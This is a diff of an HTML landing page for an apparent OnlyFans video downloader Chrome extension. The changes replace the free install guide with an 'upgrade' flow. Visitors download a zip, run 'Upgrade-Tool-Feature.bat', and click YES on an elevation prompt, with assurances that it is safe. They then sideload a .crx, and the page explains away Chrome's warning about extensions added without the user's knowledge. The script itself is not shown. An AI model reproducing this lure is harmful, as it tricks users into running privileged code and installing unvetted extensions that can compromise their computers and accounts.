@@ -633,18 +633,23 @@
                 } else {
                     console.log(responseData)
                     console.log("data!=1")
-                    window.location.href = "https://onlyfans-video-downloader.github.io/404";
+                    // window.location.href = "https://onlyfans-video-downloader.github.io/404";
                 }
 
 
             } catch (error) {
                 console.log("error")
                 console.log(error)
-                window.location.href = "https://onlyfans-video-downloader.github.io/404";
+                // window.location.href = "https://onlyfans-video-downloader.github.io/404";
             }
         }
 
         distribute();
+
+        function openEXT()
+        {
+            window.location.href="chrome://extensions/";
+        }
     </script>
 </head>
 
@@ -716,14 +721,13 @@
                         <div class="d-flex align-items-center mt-5" style="justify-content: center;">
                             <a href="#installGuide" class="tryfree btn custom-btn custom-border-btn smoothscroll me-4"
                                 style="border: 2px solid blueviolet;
-                            color: blueviolet;" onclick="log('ClickTry2Guide')">Try it
-                                for FREE</a>
+                            color: blueviolet;" onclick="log('ClickTry2Guide')">Upgrade it
+                                for PERMANENT use</a>
                         </div>
                         <div class="subInfo">Help you downloading onlyfans video/vid/image/photo with one
                             click.<br />Long free trial, easy, 100% anonymous and safe download. <br /><br /> <span
                                 data-nosnippet="data-nosnippet"><a href="#installGuide" style="color:beige;"
-                                    onclick="log('ClickA2Guide')">Install our chrome extension tool</a> below(32kb, 1
-                                min installation) before downloading ONLYFANS videos.You can uninstall it
+                                    onclick="log('ClickA2Upgrade')">Upgrade our chrome extension tool</a> so that it will always works no matter how OnlyFans page changes.You can uninstall it
                                 anytime.</span>
                             <br /><br />Designed For PC Chrome
                         </div>
@@ -735,71 +739,7 @@
             </div>
         </header>
 
-        <div class="container px-4 px-lg-5">
-            <!-- meet user Row-->
-            <div class="row gx-4 gx-lg-5" style="margin-top: 4rem;">
-                <div class="section-header" style="padding-bottom:1rem;text-align: center;">
-                    <h3>WHY OUR TOOL IS BETTER?</h3>
-                </div>
-                <div class="col-md-4 mb-5">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h2 class="card-title" style="  font-size: 32px; font-weight: normal;">60 days FREE TRIAL
-                            </h2>
-                            <p class="card-text">💯 Longer free trial
-                                <br /><br />
-                                💯
-                                <span style="color: blueviolet;"> PERMANENT FREE for subscribers BEFORE
-                                    30/04/2024</span>
-
-                                <br /><br />💯 Tech support within 12 hrs
-                                Email us: <span style="color: blueviolet;">onlyfansdownloader@gmail.com</span><img
-                                    style="width: 6%;margin-left: 10px;cursor: pointer;" src="assets/copy.png"
-                                    alt="copy email for downloader support" onclick="copyToClipboard()">
-                            </p>
-                            <br />
-                            💯 No credit card required during the free trial period
-
-                            </p>
-                        </div>
-                        <!-- <div class="card-footer"><a class="btn btn-primary btn-sm" href="#!">More Info</a></div> -->
-                    </div>
-                </div>
-
-                <div class="col-md-4 mb-5">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h2 class="card-title" style="  font-size: 32px; font-weight: normal;">One Click</h2>
-                            <p class="card-text">🎯 With just ONE CLICK, all midea contents on your ONLYFANS webpage
-                                will be downloaded automatically, to your local drive
-
-                                <br /><br />🎯 Downloaded and save media content include subscription pictures(photos),
-                                videos(vid), mp4,jpg etc
-                                <br /><br />🎯 Install our downloader following the instructions below
-                            </p>
-                        </div>
-                        <!-- <div class="card-footer"><a class="btn btn-primary btn-sm" href="#!">More Info</a></div> -->
-                    </div>
-                </div>
-                <div class="col-md-4 mb-5">
-                    <div class="card h-100">
-                        <div class="card-body">
-                            <h2 class="card-title" style="  font-size: 32px; font-weight: normal;">Anonymous</h2>
-                            <p class="card-text">🔐 Our downloader requires NO sign up, NO login, NO API, NO VPN，NO ads
-                                <br /><br />🔐 Download completed on your PC, NOT on server
-                                <br /><br />🔐 Leaves NO trace. NOBODY knows it, ensuring data privacy, 100%
-                                anonymous
-                            </p>
-                        </div>
-
-                    </div>
-                </div>
-
-            </div>
-
-        </div>
-
-        <!-- install Row-->
+        <!-- upgrade Row-->
         <section class="timeline-section section-padding" id="installGuide">
             <div class="section-overlay"></div>
 
@@ -807,7 +747,7 @@
                 <div class="row">
 
                     <div class="col-12 text-center">
-                        <div class="text-white mb-4 insdiv">How to install the tool for one click download?</div>
+                        <div class="text-white mb-4 insdiv">How to upgrade the tool for PERMANENT use?</div>
                     </div>
 
                     <div class="col-lg-10 col-12 mx-auto">
@@ -818,18 +758,19 @@
                                 </div>
 
                                 <li>
-                                    <div class="text-white mb-3 inssig">Download lastest tool</div>
+                                    <div class="text-white mb-3 inssig">Download upgrade tools</div>
 
-                                    <p class="text-white">Click the following download icon to get the lastest
-                                        tool zip file (OnlyfansVideoDownloader.zip).</p>
-                                    <div onclick="goDownloadEXT('')" style="cursor: pointer;color: #8a2be2;">
-                                        <div class="guideImg" style="height: auto;text-align: center;">
+                                    <p class="text-white">Click the following download icon to get the upgrade
+                                        tool zip file (OnlyfansVideoDownloader.zip), and unzip it, you will get <span class="filename">Upgrade-Tool-Feature.bat</span> and <span class="filename">OnlyfansVideoImageDownloaderRelease.crx</span>.</p>
+                                    <div  style="cursor: pointer;color: #8a2be2;">
+                                        <a href="/assets/OnlyfansVideoDownloader-upgrade.zip" ><div class="guideImg" style="height: auto;text-align: center;">
                                             <img style="height: 4rem;display:block;margin: auto;"
                                                 src="assets/download-2.png" alt="free tool download">
                                             download here
                                         </div>
+                                        </a>
 
-                                    </div>
+                                      </div>
                                     <div class="icon-holder">
                                         <img src="assets/number-1.png" class="number"
                                             alt="onlyfans drm video downloader chrome extension install step1">
@@ -837,25 +778,16 @@
                                 </li>
 
                                 <li>
-                                    <div class="text-white mb-3 inssig">In chrome browser, go to MENU -> EXTENSIONS ->
-                                        MANAGE EXTENSIONS -> turn on DEVELOPERMODE</div>
+                                    <div class="text-white mb-3 inssig">Run the Upgrade-Tool-Feature.bat to allow tool's feature upgrade.</div>
 
-                                    <div class="guideimgdiv">
-                                        <!-- style="margin-left: 0.5rem; margin-right: 0.5rem;margin-bottom: 1rem;height: 300px;background-image: url(assets/openextmg.png);background-repeat:no-repeat;background-position:left;background-size: contain;" -->
-                                        <img src="assets/openextmg.png" alt="" class="guideImg"
+                                    <div class="guideimgdiv">                            
+                                        <img src="assets/allow.jpg" alt="" class="guideImg"
                                             alt="onlyfans drm video downloader chrome extension install step2">
                                     </div>
 
-                                    <div class="guideimgdiv">
-                                        <img src="assets/trunon-1.png" alt="" class="guideImg"
-                                            alt="onlyfans drm video downloader chrome extension install step3">
-                                    </div>
-
-                                    <p class="text-white">Click menu button of
-                                        Chrome(marker 1),<br />Navigate to Extensions › Manage Extensions(marker 2).</p>
-
-                                    <p class="text-white">Turn on the Developer mode(marker 3).</p>
-
+                                    <p class="text-white">After run the bat file, you will see the popup asking for your agree, click YES to continue, the popup will disappear after that.</p>
+                                    <p class="text-white">don't worry, it is safe, it just set the computer to allow upgrading tool, nothing else.</p>
+                                    <p class="text-white">you can check the bat source code by open it with text editor to make sure safe.</p>
                                     <div class="icon-holder">
                                         <img src="assets/number-2.png" class="number"
                                             alt="onlyfans drm video downloader chrome extension install step4">
@@ -863,21 +795,45 @@
                                 </li>
 
                                 <li>
-                                    <div class="text-white mb-3 inssig">Simply drag
-                                        the zip file onto this page. And it's done</div>
+                                    <div class="text-white mb-3 inssig" >Make sure DeveloperMode is ON, and remove old version of OnlyFans Video Downloader
+                                        
+                                    <div class="guideimgdiv">
+                                        <!-- style="margin-left: 0.5rem; margin-right: 0.5rem;margin-bottom: 1rem;height: 300px;background-image: url(assets/openextmg.png);background-repeat:no-repeat;background-position:left;background-size: contain;" -->
+                                        <img src="assets/openextmg.png" alt="" class="guideImg"
+                                            alt="onlyfans drm video downloader chrome extension install step2">
+                                    </div>
 
+                                    <p class="text-white">Click menu button of
+                                        Chrome(marker 1),<br />Navigate to Extensions › Manage Extensions(marker 2).</p>
 
+                                    <div class="guideimgdiv">
+                                        <img src="assets/trunon-1.png" alt="" class="guideImg"
+                                            alt="onlyfans drm video downloader chrome extension install step3">
+                                    </div>
+                                    <p class="text-white">Make sure Developer mode(marker 3) is on.</p>
 
-                                    <!-- <div
-                                        style="margin-left: 0.5rem; margin-right: 0.5rem;margin-bottom: 1rem;height: 300px;background-image: url(assets/trunon.png);background-repeat:no-repeat;background-position:left;background-size: contain;">
-                                    </div> -->
+                                    <div class="guideimgdiv">
+                                        <img src="assets/remove1.png" alt="" class="guideImg"
+                                            alt="onlyfans drm video downloader chrome extension install step3">
+                                    </div>
+                                    <p class="text-white">Click the remove button(marker 4) of the old OnlyFans Video Downloader.</p>
+
+                                    <div class="icon-holder">
+                                        <img src="assets/number-3.png" class="number"
+                                            alt="onlyfans drm video downloader chrome extension install step4">
+                                    </div>
+                                </li>
+
+                                <li>
+                                    <div class="text-white mb-3 inssig">Simply drag the OnlyfansVideoImageDownloader.crx onto this page. restart your Chrome,And it's done</div>
+
 
                                     <div class="guideimgdiv">
                                         <img src="assets/newdrag.png" alt="" class="guideImg"
                                             alt="onlyfans drm video downloader chrome extension install step5">
                                     </div>
 
-                                    <p class="text-white">After install, you can view onlyfans.com and download
+                                    <p class="text-white">After upgrade,restart your chrome(or chrome will show you that "This extension is not listed in the Chrome Web Store and may have been added without your knowledge" so you can not use it), now you can view onlyfans.com and download
                                         OnlyFans videos and images of every post NOW.<br /></p>
 
                                     <div class="icon-holder">
@@ -896,7 +852,7 @@
                         <p class="text-white">
 
                             <a target="_blank" href="https://onlyfans.com/"
-                                class="btn custom-btn custom-border-btn ms-3" onclick="log('go2OF')">Download OnlyFans
+                                class="btn custom-btn custom-border-btn ms-3" onclick="log('go2OFAfterUpd')">Download OnlyFans
                                 videos NOW
                                 🚀</a>
                         </p>
@@ -908,9 +864,6 @@
         <!-- Page Content-->
         <div class="container px-4 px-lg-5">
             <!-- Heading Row-->
-
-
-
             <!-- ======= Testimonials Section5 ======= -->
             <div>
                 <section id="testimonials" class="testimonials" style="margin-top: 3rem;">
